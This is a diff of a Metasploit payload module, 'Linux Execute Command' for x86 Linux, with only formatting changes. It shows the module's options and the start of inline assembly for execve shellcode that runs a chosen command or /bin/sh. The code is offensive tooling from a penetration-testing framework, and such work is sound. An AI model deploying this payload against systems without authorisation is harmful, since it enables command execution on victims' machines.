@@ -12,38 +12,46 @@
 #
 ###
 module MetasploitModule
-
   CachedSize = 43
 
   include Msf::Payload::Single
   include Msf::Payload::Linux
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Linux Execute Command',
-      'Description'   => 'Execute an arbitrary command or just a /bin/sh shell',
-      'Author'        => ['vlad902',
-                          'Geyslan G. Bem <geyslan[at]gmail.com>'],
-      'License'       => MSF_LICENSE,
-      'References'    => [ ['URL', 'https://github.com/geyslan/SLAE/blob/master/4th.assignment/tiny_execve_sh.asm'],
-                           ['URL', 'https://github.com/geyslan/SLAE/blob/master/improvements/x86_execve_dyn.asm'] ],
-      'Platform'      => 'linux',
-      'Arch'          => ARCH_X86
-    ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Linux Execute Command',
+        'Description' => 'Execute an arbitrary command or just a /bin/sh shell',
+        'Author' => [
+          'vlad902',
+          'Geyslan G. Bem <geyslan[at]gmail.com>'
+        ],
+        'License' => MSF_LICENSE,
+        'References' => [
+          ['URL', 'https://github.com/geyslan/SLAE/blob/master/4th.assignment/tiny_execve_sh.asm'],
+          ['URL', 'https://github.com/geyslan/SLAE/blob/master/improvements/x86_execve_dyn.asm']
+        ],
+        'Platform' => 'linux',
+        'Arch' => ARCH_X86
+      )
+    )
 
     # Register exec options
     register_options(
       [
-        OptString.new('CMD',  [ false,  "The command string to execute" ]),
-      ])
+        OptString.new('CMD', [ false, "The command string to execute" ]),
+      ]
+    )
     register_advanced_options(
       [
         OptBool.new('NullFreeVersion', [ true, "Null-free shellcode version", false ])
-      ])
+      ]
+    )
   end
 
-  def generate_stage(opts={})
-    cmd             = datastore['CMD'] || ''
+  def generate_stage(opts = {})
+    cmd = datastore['CMD'] || ''
     nullfreeversion = datastore['NullFreeVersion']
     if cmd.empty?
       #
@@ -84,6 +92,7 @@ module MetasploitModule
         if cmd.length > 0xffff
           raise RangeError, "CMD length has to be smaller than %d" % 0xffff, caller()
         end
+
         if cmd.length <= 0xff # 255
           breg = "bl"
         else
@@ -94,7 +103,7 @@ module MetasploitModule
         end
         mov_cmd_len_to_breg = "mov #{breg}, #{cmd.length}"
         # 47/49 bytes without cmd (null-free)
-        payload  = <<-EOS
+        payload = <<-EOS
             xor ebx, ebx
             mul ebx
             mov al, 0xb
